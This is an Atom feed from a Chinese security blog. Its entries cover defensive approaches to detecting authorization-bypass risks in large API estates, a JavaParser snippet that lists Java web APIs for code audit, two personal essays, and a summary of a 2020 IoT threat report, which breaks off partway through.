<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[蓝色骨头]]></title>
  <link href="https://www.uxss.net/atom.xml" rel="self"/>
  <link href="https://www.uxss.net/"/>
  <updated>2021-07-10T20:20:43+08:00</updated>
  <id>https://www.uxss.net/</id>
  <author>
    <name><![CDATA[]]></name>
    
  </author>
  <generator uri="http://www.coderforart.com/">CoderForArt</generator>

  
  <entry>
    <title type="html"><![CDATA[[安全建设]API越权风险检测方式浅谈]]></title>
    <link href="https://www.uxss.net/15996523559667.html"/>
    <updated>2020-09-09T19:52:35+08:00</updated>
    <id>https://www.uxss.net/15996523559667.html</id>
    <content type="html"><![CDATA[
<p><img src="media/15996523559667/timg.jpeg" alt="timg"/></p>

<h2 id="toc_0">0x01 前言</h2>

<p>越权漏洞相较于SQLInject、XSS、SSRF等漏洞，最大的不同点在于该漏洞和权限的架构设计具有强相关性，而权限的架构设计又强依赖业务属性，这就导致了几乎每个系统的权限架构都各不相同，自动化检测的难度非常之大，误报率非常高；内部的检测准确率无法有效提升，越权漏洞数量就很难有效的下降</p>

<p>关于越权漏洞的挖掘，从原理上来看并不复杂，甚至可以说是简单，最大的难点在于信息收集能力、细心程度、对业务的理解度，这个其实也没有什么好谈的</p>

<p>关于批量/自动化越权检测的文章在网路上寥寥无几，开源的工具更是少的可怜（某些大佬手里有牛逼工具除外），今天想要说的是在甲方，特别是应用数量三位数、四位数以上的甲方，在面对大量API时的越权漏洞检测思路探讨</p>

<h2 id="toc_1">0x02 越权风险类型</h2>

<p>越权漏洞的分类及定义在[1]这个笔记里说的已经很详细了，在这里就不赘述了</p>

<ul>
<li><p>未授权访问</p></li>
<li><p>水平越权</p></li>
<li><p>垂直越权</p></li>
</ul>

<p>除了上边说的三类权限漏洞，结合业务场景，一般会将权限分为两类</p>

<ul>
<li>功能性权限/菜单权限
<ul>
<li>用户有没有权限访问这个功能/菜单</li>
</ul></li>
<li>数据性权限
<ul>
<li>用户有没有权限访问其它用户的数据</li>
</ul></li>
</ul>

<h2 id="toc_2">0x03 检测方式</h2>

<p>一个应用，可能只需要一两个小时就可以测试完成；十个应用，顶多也就一周；那一百个呢？一千个呢？</p>

<p>每天又会有几百个应用产生迭代，新增的API呢？</p>

<p>实际上一家几千人的互联网公司，负责应用安全的同学往往只有两到三个，API会有几千几万个</p>

<p>所以这里我们从黑盒、白盒、自动化、半自动的思路来探讨一下越权漏洞的解法</p>

<h4 id="toc_3">I.  黑盒+自动化</h4>

<p>主要分给两个关键部分</p>

<ul>
<li>流量采集
<ul>
<li>服务器出口日志采集</li>
<li>测试环境日志采集</li>
</ul></li>
<li>请求重放
<ul>
<li>多个账号重放请求</li>
<li>结果对比</li>
<li>排除误报</li>
</ul></li>
</ul>

<p>优点：在理想情况下，可以通过很少的人力去覆盖大量应用</p>

<p>缺点：大量的误报，安全产品死于误报；线上真实流量重放效果最好，却容易造成故障</p>

<h4 id="toc_4">II. 黑盒+半自动化</h4>

<p>这种方式一般会尝试和测试团队合作，在测试环境里进行，或者安全工程师进行单个系统测试时使用，像ZTO的authcheck、BurpSuit插件AuthMatrix等差不多都是类似的思路</p>

<ul>
<li>流量采集
<ul>
<li>浏览器被动代理或爬虫方式采集</li>
</ul></li>
<li>请求重放
<ul>
<li>多个账号重放请求</li>
<li>对response进行简化</li>
</ul></li>
<li>人工确认
<ul>
<li>对简化后的response进行判断是否存在漏洞</li>
</ul></li>
</ul>

<p>优点：最后输出的漏洞结果准确度较高，适合针对单一系统进行安全测试</p>

<p>缺点：在面对大量应用及大量迭代新增API时，效率太低</p>

<h4 id="toc_5">III. 白盒+自动化</h4>

<p>这种方式有两种思路，一种是发现存在越权风险的接口，一种是发现不存在越权风险的接口，原理是差不多的</p>

<ul>
<li>白盒扫描
<ul>
<li>入参是否包含可越权(可遍历)的参数</li>
<li>是否有从cookie或session中或获取用户标识</li>
</ul></li>
<li>风险确认
<ul>
<li>是否包含authcheck(xxid, userid)的判断逻辑</li>
<li>是否包含@authcheck的注解</li>
</ul></li>
</ul>

<p>优点：仿佛看到了可以批量发现越权风险的方法，对于一些简单的水平越权可以有效发现，而且一般一个系统的权限缺陷都是相似的，发现一个，发现一片</p>

<p>缺点：误报率太高，不能发现复杂的越权风险</p>

<h4 id="toc_6">IV. 白盒+半自动化</h4>

<p>这种思路和上面提到的”黑盒+半自动化“的思路差不多</p>

<ul>
<li>白盒扫描
<ul>
<li>扫描器应用的API list（可参考我上一篇文章[2]）</li>
<li>标明入参及用户标识、判断逻辑</li>
</ul></li>
<li>人工确认
<ul>
<li>通过白盒扫描出来的入参、用户标识、判断逻辑来判断是否存在越权风险</li>
</ul></li>
</ul>

<p>优点：对一部分水平越权、未授权访问的风险可以有效发现</p>

<p>缺点：API数量一多就不灵光了，很难发现复杂的越权</p>

<h2 id="toc_7">0x04 简单思考</h2>

<p>上边扯了这么一堆越权漏洞的检测方法，但其实并没有解决上边提出的问题</p>

<p>上千个应用、几万个接口，每天新增上百个，如何去解？存量呢？新增呢？</p>

<p>在以前，我还经常会去给开发们做一些安全培训，但是效果呢？只有少数开发能真正认识到越权的严重性，效果并不乐观，该出现的漏洞一个都没少，并且效果无法衡量</p>

<p>做应用安全也有几年的时间了，现在所谓的&quot;安全运营&quot;也越来越多人提了，那我们是运营吗？是也不是，我更喜欢称自己为“技术运营”，用技术来解决运营的困境，这个愿望是好的，扯皮的事情总是少不了的</p>

<p>回到越权漏洞的问题，每次做安全众测，都会爆出来一堆越权的问题，不乏之前出现类似漏洞的应用，然后就会有人跳出来问，你们之前复盘的action落实了吗？为什么还会出现？balabala，这些问题我又何尝不是经常问自己，到底是为什么？这段时间和教父也经常在讨论这些问题，那么问题出在哪里了呢？</p>

<p>先说一下我的思考结论，越权漏洞的解法是”流程+工具(监控)+覆盖度+蛮力“</p>

<ul>
<li>流程
<ul>
<li>举个例子，当SRC上报了一个越权漏洞过来，开发完成修复，然后进行复盘(出现这个问题的根本原因是什么？其它API会存在吗)，开发领了排查同类API的action回去，排查完成后，安全工程师核查开发同学的排查结果，形成闭环</li>
</ul></li>
<li>工具(监控)
<ul>
<li>工具这个范围就很广了，在我看来，无论是开源的还是自己开发的工具都像是一块块积木，将它们通过合适的方式组合起来，才能发挥出最大的效果；而不是为了kpi而不停的造轮子，造完一个来年再造一个</li>
<li>针对增量的API，建立完善的监控体系</li>
</ul></li>
<li>覆盖度
<ul>
<li>这个点是最关键的一个点，你会发现，每次出事的点都是你没有覆盖到的，对资产的熟悉程度，对API的监控完整度都非常重要</li>
</ul></li>
</ul>

<p>但这个也不是我真正想表达的点，因为按照上边的说法，还是要搞一套类SDL的东西出来，API那么多，人就这么两三个，到年底又变成PPT上代码了，第二年问题照旧</p>

<p>虽说在这类风险的解决上没有一招鲜的讨论，但是我觉得真正需要去做的是逐个点打穿，一步步的去收敛风险；将一个个点打穿，才能真正的解决问题，而不是浮于表面，看起来大而全，实则只不过是徒有其表；没有流程、技术支撑的东西我是不信的，不要再提什么宣导啥的，没什么用处</p>

<p>例如这个阶段就只做”复盘--开发自查--安全复查--安全挖掘漏洞--复盘”这个闭环，相信用不了半年，就可以对高危应用的风险进行有效收敛</p>

<p>上边没有提“蛮力”这个点，有时候要解决风险，地毯式排查往往是最有效的方法；为什么这么说了，假设现在开始治理越权，那几千几万个存量API怎么处理呢，等扫描器开发完成？这时候可以对API进行分级，识别出其中包含敏感信息的API，这时候就剩几千个了(也是非常庞大的工作量，但是只能硬着头皮上)，对这部分API进行地毯式排查，没有敏感信息的越权，危害还是相对可控的；方式low了点，但效果是有的，同时建立完善的新增接口监控体系，对增量API及时的进行处理;在评审了大量的接口后，归纳总结，对每个业务域的权限架构进行优化(当然这非常困难)，安全接入进去，从根本解决问题（这种方案是笔者现在正在实践的，效果半年后再来写一篇）</p>

<p>现实有时候是骨感的，干活的人没啥增加，每年的kpi都是不断的增长，很难专门拿出一段时间来做存量的攻坚，存量不解决，漏洞永不休</p>

<p>//说了这么多，下班回家脑阔疼，不想调整逻辑了，大家将就着看一下，想表达的观点就一个“找到问题，打穿它，无论用什么方法，有些苦是一定要吃的”。</p>

<p>//还有就是教父说招人一起来搞事情</p>

<p>参考：</p>

<p>[1]<a href="https://g.yuque.com/evilm/yuequan/gmqet8?language=en-us">https://g.yuque.com/evilm/yuequan/gmqet8?language=en-us</a> </p>

<p>[2]<a href="https://mp.weixin.qq.com/s/ATpoEN9QI-D5vkxDimQ8FQ">https://mp.weixin.qq.com/s/ATpoEN9QI-D5vkxDimQ8FQ</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[JavaParse(AST)获取Java Web API list]]></title>
    <link href="https://www.uxss.net/15993821624930.html"/>
    <updated>2020-09-06T16:49:22+08:00</updated>
    <id>https://www.uxss.net/15993821624930.html</id>
    <content type="html"><![CDATA[
<p><img src="media/15993821624930/AADB6CC4-5C27-4742-8D9A-79B303C6D550.png" alt="AADB6CC4-5C27-4742-8D9A-79B303C6D550"/></p>

<p>分享一个人工审计代码时的小Tips</p>

<p>在审计一个复杂的Web应用时，可能会有几百个WebAPI，如果没有一个API list，要想不漏掉的审计完还是非常费脑筋的</p>

<h3 id="toc_0">0x00 原理</h3>

<p>通过JavaParse解析Java文件，解析出WebAPI list，简单实现效果如下</p>

<p><img src="media/15993821624930/15993822688680.jpg" alt=""/></p>

<p><img src="media/15993821624930/15993822761968.jpg" alt=""/></p>

<p>关于JavaParse</p>

<p><em>Analyse, transform and generate your Java code base.</em></p>

<p><em>In its simplest form, the JavaParser library allows you to interact with Java source code as a Java object representation in a Java environment. More formally we refer to this object representation as an Abstract Syntax Tree (AST).</em></p>

<h3 id="toc_1">0x01 目标</h3>

<p>目标：将下图代码中的WebAPI解析出来</p>

<p><img src="media/15993821624930/15993823053557.jpg" alt=""/></p>

<h3 id="toc_2">0x02 效果</h3>

<p>解析完成后的效果大致是这样的，然后在针对要筛选的条件，对api进行筛选即可，例如<code>RequestMapping</code>等</p>

<pre><code class="language-text">[
{&quot;name&quot;:&quot;public List&lt;██████████&gt; ██████████(@RequestParam String ██████████)&quot;,&quot;body&quot;:&quot;Optional[{██████████},

{&quot;name&quot;:&quot;public String ██████████(@RequestParam String ██████████)&quot;,&quot;body&quot;:&quot;Optional[{██████████},

{&quot;name&quot;:&quot;public List&lt;██████████&gt; ██████████()&quot;,&quot;body&quot;:&quot;Optional[{██████████},

{&quot;name&quot;:&quot;public String help()&quot;,&quot;body&quot;:&quot;Optional[{██████████}
]
</code></pre>

<h3 id="toc_3">0x03 代码实现</h3>

<p>Gist:<a href="https://gist.github.com/B1ueB0ne/7ee600305364f76bf5105c98054f62e6">https://gist.github.com/B1ueB0ne/7ee600305364f76bf5105c98054f62e6</a></p>

<pre><code class="language-java">package net.uxss.b1ueb0ne.javaparse;

import ...

@Component
public class MethodDeclare {
  
    public JSONArray declareParseCode(String code) {
        JSONArray declareJsonArray = new JSONArray();
        CompilationUnit compilationUnit = JavaParser.parse(code);
      //解析Java源代码并创建抽象语法树。
      //解析源代码。它从提供程序获取源代码。开头指示可以在源代码中找到的内容（编译单元，块，导入...）
        try {
            TypeDeclaration declaration = compilationUnit.getType(0);
          //返回在此编译单元中声明的类型的列表。
            List&lt;BodyDeclaration&gt; list = declaration.getMembers();
          //获取这个类里面的成员
            for (BodyDeclaration bodyDeclaration : list) {
              //枚举成员
                Map&lt;String, String&gt; declareMap = new HashMap&lt;&gt;();
                if (bodyDeclaration.isMethodDeclaration()) {
                  //判断是否为方法
                    MethodDeclaration declareParse = (MethodDeclaration) bodyDeclaration;
                    declareMap.put(&quot;name&quot;, declareParse.getDeclarationAsString());
                  //获取方法名
                    declareMap.put(&quot;body&quot;, declareParse.getBody().toString());
                  //获取方法body
                }
                JSONObject declareJson = JSONObject.parseObject(JSON.toJSONString(declareMap));
              //解析成字符串
                declareJsonArray.add(declareJson);
            }
            compilationUnit.accept(new VoidVisitorAdapter&lt;Void&gt;() {
              //不返回任何内容的访问者，其所有访问方法都有一个默认实现，该实现只是以未指定的顺序访问其子方法
                @Override
                public void visit(MethodDeclaration n, Void arg) {
                    super.visit(n, arg);
                }
            }, null);
        }catch (Exception e){
            System.out.println(e);
        }
        return declareJsonArray;
    }
}
</code></pre>

<h3 id="toc_4">0x04 parse方法详解</h3>

<p>com.github.javaparser.JavaParser#parse</p>

<pre><code class="language-java">CompilationUnit compilationUnit = JavaParser.parse(code);
</code></pre>

<pre><code class="language-java">public static CompilationUnit parse(String code) {
        return simplifiedParse(COMPILATION_UNIT, provider(code));
    }
</code></pre>

<p>com.github.javaparser.JavaParser#simplifiedParse</p>

<pre><code class="language-java">private static &lt;T extends Node&gt; T simplifiedParse(ParseStart&lt;T&gt; context, Provider provider) {
        ParseResult&lt;T&gt; result = new JavaParser(staticConfiguration).parse(context, provider);
        if (result.isSuccessful()) {
            return result.getResult().get();
        }
        throw new ParseProblemException(result.getProblems());
    }
</code></pre>

<p>com.github.javaparser.JavaParser#parse</p>

<pre><code class="language-text">/**
     * Parses source code.
     * It takes the source code from a Provider.
     * The start indicates what can be found in the source code (compilation unit, block, import...)
     *
     * @param start refer to the constants in ParseStart to see what can be parsed.
     * @param provider refer to Providers to see how you can read source. The provider will be closed after parsing.
     * @param &lt;N&gt; the subclass of Node that is the result of parsing in the start.
     * @return the parse result, a collection of encountered problems, and some extra data.
     */
    public &lt;N extends Node&gt; ParseResult&lt;N&gt; parse(ParseStart&lt;N&gt; start, Provider provider) {
        assertNotNull(start);
        assertNotNull(provider);
        final GeneratedJavaParser parser = getParserForProvider(provider);
        try {
            N resultNode = start.parse(parser);
            ParseResult&lt;N&gt; result = new ParseResult&lt;&gt;(resultNode, parser.problems, parser.getTokens(),
                    parser.getCommentsCollection());

            configuration.getPostProcessors().forEach(postProcessor -&gt;
                    postProcessor.process(result, configuration));

            result.getProblems().sort(PROBLEM_BY_BEGIN_POSITION);

            return result;
        } catch (Exception e) {
            final String message = e.getMessage() == null ? &quot;Unknown error&quot; : e.getMessage();
            parser.problems.add(new Problem(message, null, e));
            return new ParseResult&lt;&gt;(null, parser.problems, parser.getTokens(), parser.getCommentsCollection());
        } finally {
            try {
                provider.close();
            } catch (IOException e) {
                // Since we&#39;re done parsing and have our result, we don&#39;t care about any errors.
            }
        }
    }
</code></pre>

<p>com.github.javaparser.JavaParser#CompilationUnit</p>

<pre><code class="language-text">/*****************************************
 * THE JAVA LANGUAGE GRAMMAR STARTS HERE *
 *****************************************/

/*
 * Program structuring syntax follows.
 */
  final public 
CompilationUnit CompilationUnit() throws ParseException {PackageDeclaration pakage = null;
        NodeList&lt;ImportDeclaration&gt; imports = emptyList();
        ImportDeclaration in = null;
        NodeList&lt;TypeDeclaration&lt;?&gt;&gt; types = emptyList();
    ModifierHolder modifier;
        TypeDeclaration&lt;?&gt; tn = null;
        ModuleDeclaration module = null;
    try {
      label_1:
      while (true) {
        if (jj_2_1(2)) {
          ;
        } else {
          break label_1;
        }
        jj_consume_token(SEMICOLON);
      }
      if (jj_2_2(2147483647)) {
        pakage = PackageDeclaration();
      } else {
        ;
      }
      label_2:
      while (true) {
        switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) {
        case ABSTRACT:
        case CLASS:
        case _DEFAULT:
        case ENUM:
        case FINAL:
        case IMPORT:
        case INTERFACE:
        case NATIVE:
        case PRIVATE:
        case PROTECTED:
        case PUBLIC:
        case STATIC:
        case STRICTFP:
        case SYNCHRONIZED:
        case TRANSIENT:
        case VOLATILE:
        case OPEN:
        case MODULE:
        case TRANSITIVE:
        case SEMICOLON:
        case AT:{
          ;
          break;
          }
        default:
          jj_la1[0] = jj_gen;
          break label_2;
        }
        switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) {
        case IMPORT:{
          in = ImportDeclaration();
imports = add(imports, in);
          break;
          }
        case ABSTRACT:
        case CLASS:
        case _DEFAULT:
        case ENUM:
        case FINAL:
        case INTERFACE:
        case NATIVE:
        case PRIVATE:
        case PROTECTED:
        case PUBLIC:
        case STATIC:
        case STRICTFP:
        case SYNCHRONIZED:
        case TRANSIENT:
        case VOLATILE:
        case OPEN:
        case MODULE:
        case TRANSITIVE:
        case SEMICOLON:
        case AT:{
          modifier = Modifiers();
          switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) {
          case CLASS:
          case INTERFACE:{
            tn = ClassOrInterfaceDeclaration(modifier);
types = add(types, tn);
            break;
            }
          case ENUM:{
            tn = EnumDeclaration(modifier);
types = add(types, tn);
            break;
            }
          case AT:{
            tn = AnnotationTypeDeclaration(modifier);
types = add(types, tn);
            break;
            }
          case OPEN:
          case MODULE:{
            module = ModuleDeclaration(modifier);
            break;
            }
          case SEMICOLON:{
            jj_consume_token(SEMICOLON);
            break;
            }
          default:
            jj_la1[1] = jj_gen;
            jj_consume_token(-1);
            throw new ParseException();
          }
          break;
          }
        default:
          jj_la1[2] = jj_gen;
          jj_consume_token(-1);
          throw new ParseException();
        }
      }
      switch ((jj_ntk==-1)?jj_ntk_f():jj_ntk) {
      case 0:{
        jj_consume_token(0);
        break;
        }
      case CTRL_Z:{
        jj_consume_token(CTRL_Z);
        break;
        }
      default:
        jj_la1[3] = jj_gen;
        jj_consume_token(-1);
        throw new ParseException();
      }
return new CompilationUnit(range(token_source.getHomeToken(), token()), pakage, imports, types, module);
    } catch (ParseException e) {
recover(EOF, e);
        final CompilationUnit compilationUnit = new CompilationUnit(range(token_source.getHomeToken(), token()), null, new NodeList&lt;ImportDeclaration&gt;(), new NodeList&lt;TypeDeclaration&lt;?&gt;&gt;(), null);
        compilationUnit.setParsed(UNPARSABLE);
        return compilationUnit;
    }
}
</code></pre>

<p><img src="media/15993821624930/15993823179626.jpg" alt=""/></p>

<p>参考资料：<a href="https://www.javadoc.io/doc/com.github.javaparser">https://www.javadoc.io/doc/com.github.javaparser</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[胡思乱想]奔涌的后浪与独立思考]]></title>
    <link href="https://www.uxss.net/15982374410900.html"/>
    <updated>2020-08-24T10:50:41+08:00</updated>
    <id>https://www.uxss.net/15982374410900.html</id>
    <content type="html"><![CDATA[
<p>从小你们就在自由探索自己的兴趣；很多人在童年就进入了不惑之年，不惑于自己喜欢什么，不喜欢什么。</p>

<span id="more"></span><!-- more -->

<p>昨天《后浪》刷屏了朋友圈，笔者也转发了，被何冰老师富有感染力的声音和部分走心的文案戳中</p>

<pre><code class="language-text">自由学习一门语言，学习一门手艺，欣赏一部电影，去遥远的地方旅行。

从小你们就在自由探索自己的兴趣；很多人在童年就进入了不惑之年，不惑于自己喜欢什么，不喜欢什么。
</code></pre>

<p>不过在看过之后回想，笔者认为这只是我们生活的一个剪影，并不能代表我们这一代人。这里不讨论宣传片里的UP主们，在上一篇中有提到，这是我们该去拥抱的新事物。</p>

<p>今天是青年节，不同于中秋节、端午节、情人节，这是一个精神的节日。</p>

<p>我们要的不应该只是小说、电影、音乐，而是不盲从不偏执.</p>

<p>建立自己完整的世界观、价值观，拥有判断、批判和独立思考的能力.</p>

<p>互联网的时代，给我们这代人带来了无数的便利和机会，同时快餐式的文化也随之而来，让时间成为一个奢侈品，思考也变得弥足珍贵。</p>

<p>所以就更应该对那些观点、事物、现象多问一句，这就是真相吗？这就是对的吗？在如今官本位、金本位的大势之下。</p>

<p>独立思考的同时更重要的是正确思考、不偏执、不杠精，因为大多数情况下往往那就是对的，但是这种能力却是需要时时刻刻保持在生活中。</p>

<p>很多人认为独立思考就是多读书，笔者却不这么认为，读书的作用更多的是让我们去了解别人的想法，从而更客观的去认识这个世界，但是思想不同于苹果，别人的思考终归是别人的，只有经过吸收、碰撞、质疑后的才会成为我们自己的，这也是我们每个人世界观构建途径的一部分（当然也可能会被不断的颠覆，不断的重构），读书更关键的在于去思考。</p>

<p>希望我们这代年轻人，不再以屁民、韭菜、社畜自居，而是试着去改变去突破，无所畏惧方有无限可能。</p>

<pre><code class="language-text">奔涌吧，后浪
</code></pre>

<p>2020.5.4 写给笔者自己</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[胡思乱想]为什么我们会对新事物产生抵触心理]]></title>
    <link href="https://www.uxss.net/15982373638552.html"/>
    <updated>2020-08-24T10:49:23+08:00</updated>
    <id>https://www.uxss.net/15982373638552.html</id>
    <content type="html"><![CDATA[
<p>当我们做出选择改变时，不知道将会得到什么，但很清楚将会失去什么。</p>

<span id="more"></span><!-- more -->

<p><img src="media/15982373638552/15982647840807.jpg" alt=""/></p>

<p>回想一下，是不是或多或少会有一些类似的场景，当出现一个新的偶像明星时，特别是帅的或漂亮的，会迅速的下一个判断，觉得没有真才实学全靠包装，觉得他们的粉丝都是脑残；在玩LOL或王者时，被对面强势英雄干的很惨，是不是每次先把自己觉得打不过的ban掉，却很少去主动练习这类强势英雄；当一项新技术、新设计、新政策出现时，网上和我们身边，往往会充斥着吐槽、抵制的声音，往往要很长一段时间才会变成真香，例如当年汽车诞生时的《红旗法案》。</p>

<p>上述的这类例子数不胜数，笔者有时候会觉得自己是不是没有跟上这个时代的节奏。所以将这种下意识的心理活动拿出来分析下，一家之言，不必当真。</p>

<p>认识的一位博学大佬，在分析人的行为时，经常会用进化论来分析，学到很多。细想了下，这种抵触心理一样可以用进化论来解释，在人类茹毛饮血的时代，危机四伏，尝试新事物往往意味着未知的风险，而不去尝试则风险会小很多，所以对未知的恐惧就写入了我们的基因里，一直到今天。</p>

<p>从人的内心来看，接受新的事物，本质是和旧的自己对抗，而与自己做斗争往往是最难的。这个旧的自己，我把它理解为成见，在《哪吒之魔童降世》里有句话感触很深：“人心中的成见是一座大山，任你怎么努力都休想搬动。”</p>

<p>但从笔者自身来看，却不是对所有的新事物都会产生抵触心理，在那些自己比较熟悉的领域，往往会有相反的状态，努力去学习最前沿的技术，希望出现使生产力更高的事物。这么看来，我们对新事物的抵触往往是出现在那些陌生或者简单了解的领域，而在这些领域，经常会出现轻视的情况，对自己简单了解的事情轻易的做出判断，在韩寒的《我也曾对那种力量一无所知》一文中详尽道出。</p>

<p>在想明白了这些后，也就理解了为什么还有那么多人在吐槽“拥抱变化”这条价值观，拥抱变化说到底也是让我们去积极拥抱新事物。因为当我们做出选择改变时，不知道将会得到什么，但很清楚将会失去什么。</p>

<p>古有“昔有学步于邯郸者，曾未得其仿佛，又复失其故步，遂匍匐而归耳。” 近有“穷则变，变则通”。有个寓言故事《谁动了我的奶酪？》，说的也是这个道理。</p>

<p>在这段时间里，笔者尝试着去改变，在面对新事物的时候，下意识的告诉自己去试一试，说不定是新的世界。当抖音、头条兴起的时候，在简单的使用过后，武断的下了“没有营养的APP”的结论，但是就是这样的业务，火遍全球，成为国内互联网公司出海比较成功的一个，背后的价值需要去深入思考（当然笔者现在还是觉得比较浪费时间），但是短视频、vlog等新的信息载体要尝试主动去拥抱。还有AI、5G等等，Elon Musk的风格是值得学习的。</p>

<p>生活中也有一些尝试，听歌的时候也会点开“今日流行”歌单盲听；在股市、币市里投了一点钱尝试去感受这个领域的变化；也有尝试着去融入00后的圈子，感受时代的变化，等等。</p>

<p>~~注：本文是笔者睡前随笔，不带有任何观点</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[IoT安全]2020 IoT Threat Report (简单解读)]]></title>
    <link href="https://www.uxss.net/15982371852368.html"/>
    <updated>2020-08-24T10:46:25+08:00</updated>
    <id>https://www.uxss.net/15982371852368.html</id>
    <content type="html"><![CDATA[
<p>今天看到PALO ALTO和Unit 42联合发布了这个不到20页的报告，读了一下，虽然篇幅稍短，但是内容还是很有价值的，结合笔者去年在做的事情，浅薄的解读下，有兴趣的可以阅读原文</p>

<span id="more"></span><!-- more -->

<h2 id="toc_0">0x01 概要</h2>

<p>报告主要分为现阶段的IoT安全格局、Top IoT Threats、结论建议三个部分。</p>

<p>第一部分主要讲现阶段IoT的安全格局，现在企业缺乏完善的IoT资产管理，缺少相应的安全产品去保护IoT设备，人力资源缺乏，整体风险很高，其中健康医疗行业风险特别高；</p>

<p>第二部分重点讲了现阶段IoT的网络攻击、密码攻击、蠕虫等Top 威胁，同时还提到了因为没打补丁的设备以及老协议，导致攻击的横向移动，越来越多的威胁演化为专门针对IoT的场景；</p>

<p>第三部分主要是讲如何解决这些威胁，4个步骤和2个最佳实践，下文会细讲。</p>

<h2 id="toc_1">0x02 IoT Security Landscape</h2>

<p>IoT是快速发展的，同时存在着很大的安全问题（数据支撑这里就不详细列了，例如2019比2018增长了21.5%的IoT设备数量、98%的IoT传输没有加密等）。</p>

<p><strong>1、企业缺少工具去识别资产和保护IoT设备</strong></p>

<ul>
<li>IT 无法准确识别IoT资产</li>
</ul>

<p>报告中认为像传统IT依靠IP和OS来进行资产管理的方式对于IoT场景是不完善的。只有准确的识别出IoT设备的类型，才可以准确的进行网络规划、安全策略部署等，可以连续的跟踪IoT设备的行为，而不是仅仅根据一个动态的IP。</p>

<p>笔者按：从笔者这一年的经历来看，这点说的非常贴切，IoT资产的管理和准入一直是个很大的痛点，通过IP来定位机器很容易丢掉，例如今天发现环境里某个IP的设备上有木马，然后去排查的时候，却发现因为DHCP随机分配IP的缘故，无法定位到问题设备了。当然这个例子有点极端，在泛IoT的场景下，mac地址也是一个非常核心的设备资产数据，但是也存在一些不足，因为泛IoT场景下设备的多样性，要准确的实现IoT设备资产管理需要多种方式的综合运用，例如流量、网络运维设备、人工排查等。</p>

<ul>
<li>现有的安全产品大多不支持IoT设备</li>
</ul>

<p>EDR等安全产品不支持IoT设备，PC上的安全产品会将IoT设备识别为未知类型，无法准确的识别风险和处置。基于网络的安全产品可以发现一部分风险，但是无法准确的识别、追踪IoT设备。</p>

<p>笔者按：这里指的IoT设备和现在国内大多数场景下的泛IoT设备含义有点不同，和监控摄像头这类产品比较类似。面对IoT环境下的设备多样性，基于流量的威胁检测成了大多数厂商的共同选择，例如本报告的发布者平底锅，当然还有笔者也在做这方面的尝试。对于发现威胁后的准确识别追踪，就需要先将IoT设备资产进行准确的识别和有效的管理。</p>

<ul>
<li>在IT和OT之间，企业缺少足够的人力资源</li>
</ul>

<p>IT主要关注IT资产,例如电脑、网络、打印机等，OT(operational technology)主要关注非IT设备，也就是上文笔者提到的泛IoT设备。因为IT和OT往往团队不在一个，而且因为电脑等IT资产发展迅速，可以获得更多的资源。而IoT设备为了稳定性(和原文有点差别，这里来自笔者实际经历的解读)，漏洞往往没有人去主动修复，存在着很大的风险。</p>

<p><strong>2、企业现在面临着巨大的IoT安全风险</strong></p>

<p>公司内的IoT设备(摄像头、打印机等)因为缺少IT维护，存在着巨大的风险。</p>

<p><img src="media/15982371852368/2020-03-12-01-03-32.png" alt="2020-03-12-01-03-32"/></p>

<p><strong>3、医疗保健行业的状况是非常危急的</strong></p>

<pre><code class="language-text">医疗设备运行着过时的操作系统
 组织内缺少安全防御能力
 医疗设备的操作系统是非常脆弱的
</code></pre>

<p><strong>4、最基本的网络隔离最佳实践没有遵守</strong></p>

<p>最简单的IoT风险补救措施就是网络细分，可以有效组织风险的横向移动。但是更多的情况下，网络划分时，没有严格细分，例如在医疗保健行业，将医疗设备和打印机等划分到一起。同时还提到了最理想的情况是进行微网络划分(在某些高危场景下确实应该这样)。</p>

<p>## 0x03 Top IoT Threats</p>

<p>针对IoT设备的威胁伴随着新的攻击技术在不断的演化，例如僵尸网络和蠕虫等</p>

<p><strong>1、网络攻击、密码攻击、IoT蠕虫威胁位居榜首</strong></p>

<p><img src="media/15982371852368/2020-03-12-01-23-24.png" alt="2020-03-12-01-23-24"/></p>

<ul>
<li><p>利用目标设备的漏洞</p>
<p>IoT设备的特性特别容易成为被攻击的目标，它们往往成为攻击者入侵其它系统的跳板。</p></li>
<li><p>密码攻击</p>
<p>笔者按：默认密码和弱密码是真的痛，无论是在应用上还是在IoT设备上。</p>
<ul>
<li>IoT蠕虫变得比IoT僵尸网络更常见</li>
</ul>
<p>笔者按：随着这几年勒索病毒的兴起，针对泛IoT设备的攻击主要都变成了这个，当然挖矿木马也非常常见。利用IoT僵尸网络的DDOS由于了解的不深，这里就不班门弄斧了。</p></li>
</ul>

<p><strong>2、没打补丁的设备、老旧的协议：横向移动的入口</strong></p>

<ul>
<li><p>补丁覆盖率低</p>
<p>笔者按：IoT设备往往会因为版本迭代，逐渐放弃对老版本的更新支持，同时因为设备运行环境及稳定性需求，往往会放弃给设备打安全补丁。</p></li>
<li><p>老旧的OT协议</p>
<p>这种情况更多的出现的工控环境下，随着网络边界的消失，这些老协议的风险正在暴露出来。</p></li>
<li><p>横向移动</p>
<p>57%的IoT设备容易受到中等或高强度的攻击，使得IoT设备成为攻击者的进攻入口。</p></li>
</ul>

<p><strong>3、许多威胁正在演化为专门针对IoT环境</strong></p>

<ul>
<li><p>P2P通信的特点</p>
<p>使得攻击可以最小化的与外界通信来控制内网环境下的IoT设备集群。</p></li>
<li><p>为host而战</p>
<p>病毒之间会互相干掉对方，争夺资源。</p></li>
<li><p>病毒的变种</p>
<p>例如Mirai系列</p></li>
</ul>

<h2 id="toc_2">0x04 总结和建议</h2>

<p><strong>1、4个步骤来降低IoT风险</strong>(虽然不全面，但是很大程度下降低了IoT的风险)</p>

<pre><code class="language-text">  1、IoT设备资产发现；
  2、打补丁；
  3、细划分VLANs；

 4、实时监控。
</code></pre>

<p>笔者吐槽：这几个步骤无理反驳，还是去买他家的盒子吧。吐槽归吐槽，这几个步骤对于现在大多数的泛IoT环境是非常有效的，但是如何做到是个难题，也是笔者去年和未来要努力去达到的。</p>

<p><strong>最佳实践1：整体思考IoT的生命周期</strong></p>

<p><img src="media/15982371852368/2020-03-12-01-53-44.png" alt="2020-03-12-01-53-44"/></p>

<ul>
<li>1、识别：设备准入</li>
